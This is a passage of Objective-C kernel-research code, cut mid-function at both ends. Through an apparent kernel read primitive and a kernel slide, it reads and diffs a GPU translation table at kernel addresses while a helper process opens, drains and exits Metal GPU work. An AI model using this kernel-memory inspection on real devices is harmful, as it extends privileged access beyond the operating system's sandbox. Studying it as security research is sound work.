        @"entryAddress": CNDUatE1Hex(entryAddress),
        @"contextIndex": @(observedIndex),
        @"checkedReadBudget": @(CNDUatE4PollCount),
        @"checkedReadsUsed": @(samples.count),
        @"pollIntervalUS": @(CNDUatE4PollIntervalUS),
        @"samples": samples,
        @"allCheckedReadsPassed": @(pollReadsPassed),
        @"helperAliveThroughoutPoll": @(helperAliveThroughoutPoll),
        @"contextClearedWhileHelperAlive": @(clearObserved),
        @"contextRetainedThroughBoundedWindow": @(!clearObserved &&
            pollReadsPassed && helperAliveThroughoutPoll &&
            samples.count == CNDUatE4PollCount),
        @"clearAttempt": clearAttempt != NSNotFound
            ? @(clearAttempt + 1) : (id)[NSNull null],
        @"claimBoundary":
            @"exact validated TTBAT entry after helper-owned Metal graph drain; helper process/socket/mapping remain alive",
    };
    CNDUatE1Persist(report);
    if (!pollReadsPassed) {
        if (reasonOut != NULL) *reasonOut = @"e5-exact-entry-read-failed";
        goto done;
    }
    if (!helperAliveThroughoutPoll) {
        if (reasonOut != NULL) *reasonOut = @"e5-helper-died-before-verdict";
        goto done;
    }
    if (!clearObserved && samples.count != CNDUatE4PollCount) {
        if (reasonOut != NULL) *reasonOut = @"e5-poll-window-incomplete";
        goto done;
    }

    uint8_t release = CNDUatE2ChildReleaseByte;
    releaseSent = CNDUatE2WriteAll(
        rendezvous.peerFD, &release, sizeof(release));
    completedPassed = releaseSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageCompleted, &completedMessage);
    completedPassed = completedPassed && completedMessage.result == 0 &&
        completedMessage.pid == readyMessage.pid &&
        completedMessage.mode == expectedMode &&
        completedMessage.primaryPatternBytes == requiredOwnerMask &&
        completedMessage.secondaryPatternBytes == requiredOwnerMask &&
        completedMessage.workloadRounds == expectedWorkloadRounds &&
        completedMessage.reserved == (rawQueueExperimentGate ? 0U : 1U) &&
        completedMessage.markerValue == releaseMarker;
    peerEOF = completedPassed &&
        CNDUatE2WaitForExternalPeerEOF(rendezvous.peerFD);
    processGone = peerEOF && CNDUatE2WaitForProcessGone(
        (pid_t)readyMessage.pid, &processGoneAttempts, &processGoneErrno);
    if (!processGone) {
        if (reasonOut != NULL) *reasonOut = @"e5-helper-cleanup-exit-failed";
        goto done;
    }
    finalSnapshotPassed = CNDUatE1SnapshotTTBAT(
        report, api, @"e5.after-cleanup", ttbat,
        &afterCleanup, &afterSummary);
    if (finalSnapshotPassed) {
        exactCleanupClosePassed = CNDUatE2ExactCloseTransitionRaw(
            &whileOpen, &afterCleanup, observedIndex,
            &rawCleanupChangedCount);
        cleanupChanges = CNDUatE1TTBATDiff(
            &whileOpen, &afterCleanup, ttbat, @"cleanup-exit");
    }
    report[@"afterCleanupTTBATSnapshot"] = afterSummary ?: @{};
    report[@"cleanupChanges"] = cleanupChanges ?: @[];
    report[@"e5CleanupExit"] = @{
        @"releaseSentAfterVerdict": @(releaseSent),
        @"completedMessagePassed": @(completedPassed),
        @"peerEOF": @(peerEOF),
        @"processGone": @(processGone),
        @"processGonePollAttempts": @(processGoneAttempts),
        @"processGoneErrno": @(processGoneErrno),
        @"finalSnapshotPassed": @(finalSnapshotPassed),
        @"exactSameIndexClosePassed": @(exactCleanupClosePassed),
        @"rawChangedEntryCount": @(rawCleanupChangedCount),
        @"excludedFromMeasuredAction": @YES,
    };
    CNDUatE1Persist(report);
    if (!finalSnapshotPassed || !exactCleanupClosePassed) {
        if (reasonOut != NULL) *reasonOut = @"e5-final-cleanup-gate-failed";
        goto done;
    }

    report[@"e5ContextClearedWhileHelperAlive"] = @(clearObserved);
    report[@"e5ContextRetainedAfterOwnerDrain"] = @(!clearObserved);
    report[@"e5PrivateDeviceReleased"] = @(deviceReleaseGate);
    report[@"e5LowLevelConnectionOwnerReleased"] =
        @(connectionReleaseGate);
    report[@"e5RawIOQueueReleased"] = @(rawQueueExperimentGate);
    report[@"e5RawIOQueueBoundBeforeRelease"] =
        @(rawQueueBindReleaseGate);
    report[@"namedActionStatus"] = rawQueueBindReleaseGate
        ? (clearObserved
            ? @"bound-raw-io-command-queue-destroyed-context-cleared-notification-connection-process-alive"
            : @"bound-raw-io-command-queue-destroyed-context-retained-notification-connection-process-alive")
        : (rawQueueReleaseGate
        ? (clearObserved
            ? @"raw-io-command-queue-destroyed-context-cleared-connection-process-alive"
            : @"raw-io-command-queue-destroyed-context-retained-connection-process-alive")
        : (connectionReleaseGate
        ? (clearObserved
            ? @"iogpu-metal-device-owner-released-context-cleared-process-alive"
            : @"iogpu-metal-device-owner-released-context-retained-process-alive")
        : (deviceReleaseGate
        ? (clearObserved
            ? @"private-metal-device-released-context-cleared-process-alive"
            : @"private-metal-device-released-context-retained-process-alive")
        : (clearObserved
            ? @"helper-owned-metal-graph-drained-context-cleared-process-alive"
            : @"helper-owned-metal-graph-drained-context-retained-process-alive"))));
    CNDUatE1Persist(report);
    result = CNDUatE1TTBATRunObservedDiff;
    if (reasonOut != NULL) {
        *reasonOut = rawQueueBindReleaseGate
            ? (clearObserved
                ? @"validated-e5-bound-raw-queue-release-context-cleared-with-notification-connection-alive"
                : @"validated-e5-bound-raw-queue-release-context-retained")
            : (rawQueueReleaseGate
            ? (clearObserved
                ? @"validated-e5-raw-queue-release-context-cleared-with-connection-alive"
                : @"validated-e5-raw-queue-release-context-retained")
            : (connectionReleaseGate
            ? (clearObserved
                ? @"validated-e5-connection-release-context-cleared-with-helper-alive"
                : @"validated-e5-connection-release-context-retained")
            : (deviceReleaseGate
            ? (clearObserved
                ? @"validated-e5-device-release-context-cleared-with-helper-alive"
                : @"validated-e5-device-release-context-retained")
            : (clearObserved
                ? @"validated-e5-context-cleared-with-helper-alive"
                : @"validated-e5-context-retained-after-owner-drain"))));
    }
    log_user("[UAT_E5] finished mode=%s context=%lu clearedWhileAlive=%d "
             "checkedReads=%lu cleanupExit=pass\n",
             modeName.UTF8String, (unsigned long)observedIndex, clearObserved,
             (unsigned long)samples.count);

done:
    if (rendezvous.peerFD >= 0 && !releaseSent) {
        uint8_t release = CNDUatE2ChildReleaseByte;
        (void)CNDUatE2WriteAll(
            rendezvous.peerFD, &release, sizeof(release));
    }
    CNDUatE2CloseExternalRendezvous(&rendezvous);
    if (sharedMapping != MAP_FAILED) {
        cleanupUnmapped = munmap(sharedMapping, CNDUatE1PageSize) == 0;
        sharedMapping = MAP_FAILED;
        sharedWords = NULL;
    } else {
        cleanupUnmapped = true;
    }
    if (sharedFD >= 0) {
        cleanupClosed = close(sharedFD) == 0;
        sharedFD = -1;
    } else {
        cleanupClosed = true;
    }
    if (sharedFileCreated && sharedFileURL != nil) {
        cleanupUnlinked = unlink(sharedFileURL.fileSystemRepresentation) == 0;
    } else {
        cleanupUnlinked = true;
    }
    report[@"e5SharedFileCleanup"] = @{
        @"ownFileOnly": @YES,
        @"unmapped": @(cleanupUnmapped),
        @"closed": @(cleanupClosed),
        @"unlinked": @(cleanupUnlinked),
        @"passed": @(cleanupUnmapped && cleanupClosed && cleanupUnlinked),
    };
    if (!cleanupUnmapped || !cleanupClosed || !cleanupUnlinked) {
        result = CNDUatE1TTBATRunAborted;
        if (reasonOut != NULL) *reasonOut = @"e5-shared-file-cleanup-failed";
    }
    report[@"e5KernelWrites"] = @0;
    report[@"e5PointerScanUsed"] = @NO;
    report[@"e5GetPTEInvoked"] = @NO;
    report[@"e5QueueProbeInvoked"] = @NO;
    CNDUatE1Persist(report);
    return result;
}

static CNDUatE1TTBATRunResult CNDUatE4RunInflightRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, NSString **reasonOut)
{
    CNDUatE1TTBATRunResult result = CNDUatE1TTBATRunAborted;
    CNDUatE1TTBATSnapshot before = {0};
    CNDUatE1TTBATSnapshot whileOpen = {0};
    CNDUatE1TTBATSnapshot afterExit = {0};
    NSDictionary *beforeSummary = nil;
    NSDictionary *whileSummary = nil;
    NSDictionary *afterSummary = nil;
    NSArray *openChanges = nil;
    NSArray *closeChanges = nil;
    NSDictionary *openTransition = nil;
    NSMutableArray *sampleReport = nil;
    NSString *tokenHex = @"";
    NSString *chronology = @"not-run";
    NSString *sharedFileName = @"";
    NSURL *groupContainerURL = nil;
    NSURL *sharedFileURL = nil;
    CNDUatE2ExternalRendezvous rendezvous = {
        .listenFD = -1, .peerFD = -1, .port = 0,
    };
    CNDUatE2ExternalMessage readyMessage = {0};
    CNDUatE2ExternalMessage exitingMessage = {0};
    int sharedFD = -1;
    struct stat sharedStat = {0};
    void *sharedMapping = MAP_FAILED;
    volatile uint32_t *sharedWords = NULL;
    CNDUatE4PollSample samples[CNDUatE4PollCount] = {0};
    NSUInteger sampleCount = 0;
    NSUInteger observedIndex = NSNotFound;
    NSUInteger clearAttempt = NSNotFound;
    NSUInteger terminalBeforeAttempt = NSNotFound;
    NSUInteger terminalAfterAttempt = NSNotFound;
    NSUInteger postClearMarkerAttempt = NSNotFound;
    NSUInteger processGoneAttempts = 0;
    int processGoneErrno = 0;
    int rendezvousError = 0;
    uint32_t controlObserved = 0;
    uint32_t resetObserved = UINT32_MAX;
    uint32_t finalMarker = 0;
    uint32_t synchronizedFinalMarker = 0;
    int sharedFileOpenError = 0;
    int sharedFileMapError = 0;
    int sharedFileSyncError = 0;
    int finalSyncError = 0;
    bool groupContainerResolved = false;
    bool sharedFileCreated = false;
    bool sharedFileIdentityPassed = false;
    bool sharedFileMapped = false;
    bool sharedFilePrepared = false;
    bool cleanupUnmapped = false;
    bool cleanupClosed = false;
    bool cleanupUnlinked = false;
    bool rendezvousOpened = false;
    bool helperAccepted = false;
    bool configSent = false;
    bool helperReady = false;
    bool controlPassed = false;
    bool resetPassed = false;
    bool submitSent = false;
    bool exitingPassed = false;
    bool scheduledInFlight = false;
    bool pollReadsPassed = true;
    bool clearObserved = false;
    bool peerEOF = false;
    bool processGone = false;
    bool finalSnapshotPassed = false;
    bool exactClosePassed = false;
    NSUInteger rawCloseChangedCount = 0;

    uint64_t readyAddress = CNDUatE1IOUATMapsReady + slide;
    CNDUatE1Progress(report, @"e4.ttbat", @"read-maps-ready", readyAddress);
    uint8_t ready = 0;
    if (!CNDUatE1Read8(api, readyAddress, &ready) || ready != 2) {
        report[@"ttbatMapsReady"] = @(ready);
        if (reasonOut != NULL) *reasonOut = @"e4-ttbat-maps-not-ready";
        goto done;
    }

    uint64_t mapSlotAddress = CNDUatE1TTBATMapVA + slide;
    CNDUatE1Progress(report, @"e4.ttbat", @"read-retained-map-va",
                     mapSlotAddress);
    uint64_t ttbatRaw = 0;
    if (!CNDUatE1Read64(api, mapSlotAddress, &ttbatRaw)) {
        if (reasonOut != NULL) *reasonOut = @"e4-ttbat-map-read-failed";
        goto done;
    }
    uint64_t ttbat = CNDUatE1CanonicalPointer(api, ttbatRaw);
    bool ttbatPassed = ttbatRaw == ttbat && ttbat != 0 &&
        (ttbat & (CNDUatE1PageSize - 1)) == 0 &&
        sizeof(before) <= CNDUatE1PageSize;
    report[@"ttbatMapPredicate"] = @{
        @"slotAddress": CNDUatE1Hex(mapSlotAddress),
        @"raw": CNDUatE1Hex(ttbatRaw),
        @"canonical": CNDUatE1Hex(ttbat),
        @"aligned16K": @((ttbat & (CNDUatE1PageSize - 1)) == 0),
        @"mappingTarget": @"permanent-kernel-task",
        @"staticLifetimeWitness":
            @"C26-E1-TTBAT-EL1-MAP-LIFETIME-TRACE-20261105",
        @"passed": @(ttbatPassed),
    };
    CNDUatE1Persist(report);
    if (!ttbatPassed) {
        if (reasonOut != NULL) *reasonOut = @"e4-ttbat-map-predicate-failed";
        goto done;
    }
    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"e4.before", ttbat, &before, &beforeSummary)) {
        if (reasonOut != NULL) *reasonOut = @"e4-before-snapshot-failed";
        goto done;
    }
    report[@"tableReached"] = @YES;
    report[@"beforeTTBATSnapshot"] = beforeSummary;
    CNDUatE1Persist(report);

    CNDUatE1Progress(
        report, @"e4.action", @"open-external-helper-rendezvous", 0);
    rendezvousOpened = CNDUatE2OpenExternalRendezvous(
        &rendezvous, &rendezvousError);
    tokenHex = CNDUatE2TokenHex(rendezvous.token);
    if (!rendezvousOpened) {
        if (reasonOut != NULL) *reasonOut = @"e4-rendezvous-failed";
        goto done;
    }

    groupContainerURL = [[NSFileManager defaultManager]
        containerURLForSecurityApplicationGroupIdentifier:
            CNDUatE4AppGroupIdentifier];
    groupContainerResolved = groupContainerURL != nil;
    sharedFileName = [NSString stringWithFormat:@"e4-%@.bin", tokenHex];
    sharedFileURL = groupContainerResolved
        ? [groupContainerURL URLByAppendingPathComponent:
            sharedFileName isDirectory:NO]
        : nil;
    if (sharedFileURL != nil) {
        sharedFD = open(sharedFileURL.fileSystemRepresentation,
                        O_CREAT | O_EXCL | O_RDWR | O_CLOEXEC,
                        S_IRUSR | S_IWUSR);
        if (sharedFD < 0) sharedFileOpenError = errno;
    }
    sharedFileCreated = sharedFD >= 0;
    bool sizePassed = sharedFileCreated &&
        ftruncate(sharedFD, CNDUatE1PageSize) == 0;
    bool statPassed = sizePassed && fstat(sharedFD, &sharedStat) == 0;
    sharedFileIdentityPassed = statPassed &&
        S_ISREG(sharedStat.st_mode) &&
        sharedStat.st_size == CNDUatE1PageSize &&
        sharedStat.st_uid == getuid() && sharedStat.st_nlink == 1 &&
        (uint64_t)sharedStat.st_dev != 0 &&
        (uint64_t)sharedStat.st_ino != 0;
    if (sharedFileIdentityPassed) {
        sharedMapping = mmap(NULL, CNDUatE1PageSize,
                             PROT_READ | PROT_WRITE, MAP_SHARED,
                             sharedFD, 0);
        if (sharedMapping == MAP_FAILED) sharedFileMapError = errno;
    }
    sharedFileMapped = sharedMapping != MAP_FAILED;
    if (sharedFileMapped) {
        sharedWords = (volatile uint32_t *)sharedMapping;
        memset(sharedMapping, 0, CNDUatE1PageSize);
        __sync_synchronize();
        if (msync(sharedMapping, CNDUatE1PageSize, MS_SYNC) != 0) {
            sharedFileSyncError = errno;
        }
        sharedFilePrepared = sharedFileSyncError == 0 &&
            __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST) == 0;
    }
    report[@"e4SharedCanary"] = @{
        @"transport": @"app-group-map-shared-file",
        @"groupIdentifier": CNDUatE4AppGroupIdentifier,
        @"groupContainerResolved": @(groupContainerResolved),
        @"fileName": sharedFileName,
        @"createdExclusive": @(sharedFileCreated),
        @"openError": @(sharedFileOpenError),
        @"mappedShared": @(sharedFileMapped),
        @"mapError": @(sharedFileMapError),
        @"syncError": @(sharedFileSyncError),
        @"device": CNDUatE1Hex((uint64_t)sharedStat.st_dev),
        @"inode": CNDUatE1Hex((uint64_t)sharedStat.st_ino),
        @"size": @((long long)sharedStat.st_size),
        @"ownerUID": @((unsigned)sharedStat.st_uid),
        @"linkCount": @((unsigned long long)sharedStat.st_nlink),
        @"mode": @((unsigned)(sharedStat.st_mode & 0777)),
        @"identityPassed": @(sharedFileIdentityPassed),
        @"observerOwned": @YES,
        @"initialMarker": @(sharedWords != NULL
            ? __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST) : UINT32_MAX),
        @"passed": @(sharedFilePrepared),
    };
    CNDUatE1Persist(report);
    if (!sharedFilePrepared) {
        if (reasonOut != NULL) *reasonOut =
            @"e4-app-group-shared-file-preflight-failed";
        goto done;
    }

    report[@"externalHelperRendezvous"] = @{
        @"opened": @(rendezvousOpened),
        @"error": @(rendezvousError),
        @"observerPID": @(getpid()),
        @"port": @(rendezvous.port),
        @"token": tokenHex,
        @"address": @"127.0.0.1",
        @"loopbackOnly": @YES,
        @"helperBundleID": CNDUatE4HelperBundleIdentifier,
        @"protocolVersion": @(CNDUatE2ExternalMessageVersion),
        @"sharedFileName": sharedFileName,
        @"sharedFileDevice": CNDUatE1Hex((uint64_t)sharedStat.st_dev),
        @"sharedFileInode": CNDUatE1Hex((uint64_t)sharedStat.st_ino),
        @"helperTouchesKRWLifecycle": @NO,
        @"hostLaunchRequired": @YES,
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E4] external-helper-ready observerPid=%d port=%u "
             "token=%s bundle=%s mode=inflight "
             "file=%s dev=0x%llx inode=0x%llx\n",
             getpid(), rendezvous.port, tokenHex.UTF8String,
             CNDUatE4HelperBundleIdentifier.UTF8String,
             sharedFileName.UTF8String,
             (unsigned long long)sharedStat.st_dev,
             (unsigned long long)sharedStat.st_ino);

    helperAccepted = CNDUatE2AcceptExternalHelper(
        &rendezvous, &rendezvousError);
    CNDUatE4Config config = {
        .magic = CNDUatE4ConfigMagic,
        .version = CNDUatE4ConfigVersion,
        .controlMarker = CNDUatE4ControlMarker,
        .terminalMarker = CNDUatE4TerminalMarker,
        .workloadRounds = CNDUatE4WorkloadRounds,
        .reserved = 0,
        .fileDevice = (uint64_t)sharedStat.st_dev,
        .fileInode = (uint64_t)sharedStat.st_ino,
    };
    memcpy(config.token, rendezvous.token, sizeof(config.token));
    configSent = helperAccepted && CNDUatE2WriteAll(
        rendezvous.peerFD, &config, sizeof(config));
    helperReady = configSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageReady, &readyMessage);
    helperReady = helperReady && readyMessage.result == 0 &&
        readyMessage.mode == CNDUatE4ExternalModeInflight &&
        readyMessage.surfaceID == 0 &&
        readyMessage.gpuAddress == (uint64_t)sharedStat.st_dev &&
        readyMessage.secondaryGPUAddress == (uint64_t)sharedStat.st_ino &&
        readyMessage.workloadRounds == CNDUatE4WorkloadRounds &&
        readyMessage.markerValue == CNDUatE4ControlMarker &&
        readyMessage.metalStatus == 4 && readyMessage.fillVerified == 1;
    if (helperReady && sharedWords != NULL) {
        __sync_synchronize();
        controlObserved = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
        controlPassed = controlObserved == CNDUatE4ControlMarker;
    }
    report[@"e4LiveControl"] = @{
        @"helperAccepted": @(helperAccepted),
        @"acceptError": @(rendezvousError),
        @"configSent": @(configSent),
        @"readyMessagePassed": @(helperReady),
        @"pid": @(readyMessage.pid),
        @"transport": @"app-group-map-shared-file",
        @"fileName": sharedFileName,
        @"fileDeviceExpected": CNDUatE1Hex((uint64_t)sharedStat.st_dev),
        @"fileDeviceReported": CNDUatE1Hex(readyMessage.gpuAddress),
        @"fileInodeExpected": CNDUatE1Hex((uint64_t)sharedStat.st_ino),
        @"fileInodeReported": CNDUatE1Hex(
            readyMessage.secondaryGPUAddress),
        @"metalStatus": @(readyMessage.metalStatus),
        @"fillVerified": @(readyMessage.fillVerified != 0),
        @"controlMarkerExpected": CNDUatE1Hex(CNDUatE4ControlMarker),
        @"controlMarkerObserved": CNDUatE1Hex(controlObserved),
        @"passed": @(controlPassed),
    };
    CNDUatE1Persist(report);
    if (!helperReady || !controlPassed) {
        if (reasonOut != NULL) *reasonOut = @"e4-live-control-failed";
        goto done;
    }

    if (sharedWords != NULL) {
        sharedWords[0] = 0;
        __sync_synchronize();
        int resetSync = msync(sharedMapping, CNDUatE1PageSize, MS_SYNC);
        resetObserved = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
        resetPassed = resetSync == 0 && resetObserved == 0;
    }
    report[@"e4CanaryReset"] = @{
        @"expected": @0,
        @"observed": CNDUatE1Hex(resetObserved),
        @"passed": @(resetPassed),
    };
    CNDUatE1Persist(report);
    if (!resetPassed) {
        if (reasonOut != NULL) *reasonOut = @"e4-canary-reset-failed";
        goto done;
    }

    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"e4.while-open", ttbat,
            &whileOpen, &whileSummary)) {
        if (reasonOut != NULL) *reasonOut = @"e4-while-open-snapshot-failed";
        goto done;
    }
    openChanges = CNDUatE1TTBATDiff(
        &before, &whileOpen, ttbat, @"open");
    openTransition = CNDUatE2ExactOpenTransition(openChanges);
    observedIndex = openTransition != nil
        ? [openTransition[@"index"] unsignedIntegerValue] : NSNotFound;
    report[@"whileOpenTTBATSnapshot"] = whileSummary;
    report[@"openChanges"] = openChanges ?: @[];
    report[@"e4ContextIndex"] = observedIndex != NSNotFound
        ? @(observedIndex) : (id)[NSNull null];
    CNDUatE1Persist(report);
    if (openTransition == nil || observedIndex >= CNDUatE1TTBATEntries) {
        if (reasonOut != NULL) *reasonOut = @"e4-exact-open-transition-failed";
        goto done;
    }
    log_user("[UAT_E4] live-control passed pid=%u file=%s context=%lu "
             "root0=0x%016llx root1=0x%016llx\n",
             readyMessage.pid, sharedFileName.UTF8String,
             (unsigned long)observedIndex,
             (unsigned long long)(whileOpen.words[observedIndex * 2] &
                 CNDUatE1TTBATPaddrMask),
             (unsigned long long)(whileOpen.words[observedIndex * 2 + 1] &
                 CNDUatE1TTBATPaddrMask));

    uint8_t submit = CNDUatE2ExternalSubmitByte;
    submitSent = CNDUatE2WriteAll(
        rendezvous.peerFD, &submit, sizeof(submit));
    exitingPassed = submitSent && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageExiting, &exitingMessage);
    exitingPassed = exitingPassed && exitingMessage.result == 0 &&
        exitingMessage.pid == readyMessage.pid &&
        exitingMessage.mode == CNDUatE4ExternalModeInflight &&
        exitingMessage.surfaceID == 0 &&
        exitingMessage.gpuAddress == (uint64_t)sharedStat.st_dev &&
        exitingMessage.secondaryGPUAddress == (uint64_t)sharedStat.st_ino &&
        exitingMessage.workloadRounds == CNDUatE4WorkloadRounds &&
        exitingMessage.markerValue == CNDUatE4TerminalMarker;
    scheduledInFlight = exitingPassed && exitingMessage.metalStatus == 3;
    report[@"e4ScheduledExit"] = @{
        @"submitSent": @(submitSent),
        @"exitingMessagePassed": @(exitingPassed),
        @"metalStatus": @(exitingMessage.metalStatus),
        @"requiredMetalStatus": @3,
        @"completedTooEarly": @(exitingPassed &&
            exitingMessage.metalStatus == 4),
        @"scheduledInFlight": @(scheduledInFlight),
    };
    CNDUatE1Persist(report);
    if (!scheduledInFlight) {
        if (reasonOut != NULL) *reasonOut = exitingPassed &&
            exitingMessage.metalStatus == 4
            ? @"e4-workload-completed-before-exit"
            : @"e4-scheduled-exit-gate-failed";
        goto done;
    }

    uint64_t entryAddress = ttbat +
        observedIndex * CNDUatE1TTBATStride;
    log_user("[UAT_E4] polling exact-entry address=0x%016llx "
             "terminal=0x%08x reads=%u\n",
             (unsigned long long)entryAddress, CNDUatE4TerminalMarker,
             CNDUatE4PollCount);
    for (NSUInteger attempt = 0; attempt < CNDUatE4PollCount; attempt++) {
        CNDUatE4PollSample *sample = &samples[attempt];
        sample->markerBefore = __atomic_load_n(
            sharedWords, __ATOMIC_SEQ_CST);
        sample->timestamp = mach_continuous_time();
        uint64_t words[2] = {0};
        sample->readPassed = CNDUatE1Read(
            api, entryAddress, words, sizeof(words));
        sample->word0 = words[0];
        sample->word1 = words[1];
        sample->markerAfter = __atomic_load_n(
            sharedWords, __ATOMIC_SEQ_CST);
        sample->valid = (words[0] & 1) != 0 || (words[1] & 1) != 0;
        sampleCount = attempt + 1;
        if (!sample->readPassed) {
            pollReadsPassed = false;
            break;
        }
        if (sample->markerBefore == CNDUatE4TerminalMarker &&
            terminalBeforeAttempt == NSNotFound) {
            terminalBeforeAttempt = attempt;
        }
        if (sample->markerAfter == CNDUatE4TerminalMarker &&
            terminalAfterAttempt == NSNotFound) {
            terminalAfterAttempt = attempt;
        }
        if (!sample->valid && clearAttempt == NSNotFound) {
            clearAttempt = attempt;
            clearObserved = true;
            break;
        }
        if (attempt + 1 < CNDUatE4PollCount) {
            usleep(CNDUatE4PollIntervalUS);
        }
    }
    if (!pollReadsPassed) {
        if (reasonOut != NULL) *reasonOut = @"e4-exact-entry-read-failed";
        goto done;
    }
    if (clearObserved &&
        samples[clearAttempt].markerBefore != CNDUatE4TerminalMarker &&
        samples[clearAttempt].markerAfter != CNDUatE4TerminalMarker) {
        for (NSUInteger attempt = 0;
             attempt < CNDUatE4PostClearMarkerPollCount; attempt++) {
            finalMarker = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
            if (finalMarker == CNDUatE4TerminalMarker) {
                postClearMarkerAttempt = attempt;
                break;
            }
            if (attempt + 1 < CNDUatE4PostClearMarkerPollCount) {
                usleep(CNDUatE4PostClearMarkerPollIntervalUS);
            }
        }
    } else {
        finalMarker = __atomic_load_n(sharedWords, __ATOMIC_SEQ_CST);
    }

    peerEOF = CNDUatE2WaitForExternalPeerEOF(rendezvous.peerFD);
    processGone = peerEOF && CNDUatE2WaitForProcessGone(
        (pid_t)readyMessage.pid, &processGoneAttempts,
        &processGoneErrno);
    if (!processGone) {
        if (reasonOut != NULL) *reasonOut = @"e4-helper-exit-gate-failed";
        goto done;
    }
    finalSnapshotPassed = CNDUatE1SnapshotTTBAT(
        report, api, @"e4.after-exit", ttbat,
        &afterExit, &afterSummary);
    if (finalSnapshotPassed) {
        exactClosePassed = CNDUatE2ExactCloseTransitionRaw(
            &whileOpen, &afterExit, observedIndex,
            &rawCloseChangedCount);
        closeChanges = CNDUatE1TTBATDiff(
            &whileOpen, &afterExit, ttbat, @"close");
    }
    if (sharedMapping != MAP_FAILED) {
        if (msync(sharedMapping, CNDUatE1PageSize,
                  MS_SYNC | MS_INVALIDATE) != 0) {
            finalSyncError = errno;
        }
        __sync_synchronize();
        synchronizedFinalMarker = __atomic_load_n(
            sharedWords, __ATOMIC_SEQ_CST);
    }

    sampleReport = [NSMutableArray arrayWithCapacity:sampleCount];
    for (NSUInteger index = 0; index < sampleCount; index++) {
        CNDUatE4PollSample sample = samples[index];
        [sampleReport addObject:@{
            @"attempt": @(index + 1),
            @"timestampMachContinuous": CNDUatE1Hex(sample.timestamp),
            @"word0": CNDUatE1Hex(sample.word0),
            @"word1": CNDUatE1Hex(sample.word1),
            @"markerBefore": CNDUatE1Hex(sample.markerBefore),
            @"markerAfter": CNDUatE1Hex(sample.markerAfter),
            @"readPassed": @(sample.readPassed),
            @"valid": @(sample.valid),
        }];
    }
    bool markerBeforeObservedClear = clearObserved &&
        samples[clearAttempt].markerBefore == CNDUatE4TerminalMarker;
    bool markerSameReadBracket = clearObserved &&
        samples[clearAttempt].markerBefore != CNDUatE4TerminalMarker &&
        samples[clearAttempt].markerAfter == CNDUatE4TerminalMarker;
    bool markerAfterObservedClear = clearObserved &&
        samples[clearAttempt].markerBefore != CNDUatE4TerminalMarker &&
        samples[clearAttempt].markerAfter != CNDUatE4TerminalMarker &&
        postClearMarkerAttempt != NSNotFound;
    bool markerVisibleOnlyAfterFinalSync =
        synchronizedFinalMarker == CNDUatE4TerminalMarker &&
        terminalBeforeAttempt == NSNotFound &&
        terminalAfterAttempt == NSNotFound &&
        postClearMarkerAttempt == NSNotFound;
    chronology = markerBeforeObservedClear
        ? @"terminal-visible-before-clear-observation"
        : (markerSameReadBracket
            ? @"terminal-and-clear-same-read-bracket"
            : (markerAfterObservedClear
                ? @"terminal-first-visible-after-clear-observation"
                : (markerVisibleOnlyAfterFinalSync
                    ? @"terminal-visible-only-after-final-sync"
                    : (clearObserved
                        ? @"clear-observed-terminal-not-visible"
                        : @"clear-not-observed-within-read-budget"))));
    report[@"e4OrderingObservation"] = @{
        @"entryAddress": CNDUatE1Hex(entryAddress),
        @"contextIndex": @(observedIndex),
        @"checkedReadBudget": @(CNDUatE4PollCount),
        @"checkedReadsUsed": @(sampleCount),
        @"pollIntervalUS": @(CNDUatE4PollIntervalUS),
        @"samples": sampleReport,
        @"clearAttempt": clearAttempt != NSNotFound
            ? @(clearAttempt + 1) : (id)[NSNull null],
        @"terminalBeforeAttempt": terminalBeforeAttempt != NSNotFound
            ? @(terminalBeforeAttempt + 1) : (id)[NSNull null],
        @"terminalAfterAttempt": terminalAfterAttempt != NSNotFound
            ? @(terminalAfterAttempt + 1) : (id)[NSNull null],
        @"postClearMarkerAttempt": postClearMarkerAttempt != NSNotFound
            ? @(postClearMarkerAttempt + 1) : (id)[NSNull null],
        @"directFinalMarker": CNDUatE1Hex(finalMarker),
        @"synchronizedFinalMarker": CNDUatE1Hex(
            synchronizedFinalMarker),
        @"finalSharedFileSyncError": @(finalSyncError),
        @"chronology": chronology,
        @"claimBoundary":
            @"observed CPU visibility versus checked TTBAT reads; not a GPU execution timestamp",
    };
    report[@"afterExitTTBATSnapshot"] = afterSummary ?: @{};
    report[@"closeChanges"] = closeChanges ?: @[];
    report[@"e4ExitGates"] = @{
        @"exitingMessagePassed": @(exitingPassed),
        @"peerEOF": @(peerEOF),
        @"processGone": @(processGone),
        @"processGonePollAttempts": @(processGoneAttempts),
        @"processGoneErrno": @(processGoneErrno),
        @"finalSnapshotPassed": @(finalSnapshotPassed),
        @"exactSameIndexClosePassed": @(exactClosePassed),
        @"rawCloseChangedEntryCount": @(rawCloseChangedCount),
    };
    CNDUatE1Persist(report);
    if (!finalSnapshotPassed || !exactClosePassed) {
        if (reasonOut != NULL) *reasonOut = @"e4-final-close-gate-failed";
        goto done;
    }

    report[@"namedActionStatus"] =
        @"external-helper-exited-context-cleared";
    CNDUatE1Persist(report);
    result = CNDUatE1TTBATRunObservedDiff;
    if (reasonOut != NULL) {
        *reasonOut = [@"validated-e4-" stringByAppendingString:chronology];
    }
    log_user("[UAT_E4] finished context=%lu chronology=%s marker=0x%08x "
             "clearAttempt=%lu checkedReads=%lu\n",
             (unsigned long)observedIndex, chronology.UTF8String,
             synchronizedFinalMarker,
             (unsigned long)(clearAttempt != NSNotFound
                ? clearAttempt + 1 : 0),
             (unsigned long)sampleCount);

done:
    if (rendezvous.peerFD >= 0 && !submitSent) {
        uint8_t release = CNDUatE2ChildReleaseByte;
        (void)CNDUatE2WriteAll(
            rendezvous.peerFD, &release, sizeof(release));
    }
    CNDUatE2CloseExternalRendezvous(&rendezvous);
    if (sharedMapping != MAP_FAILED) {
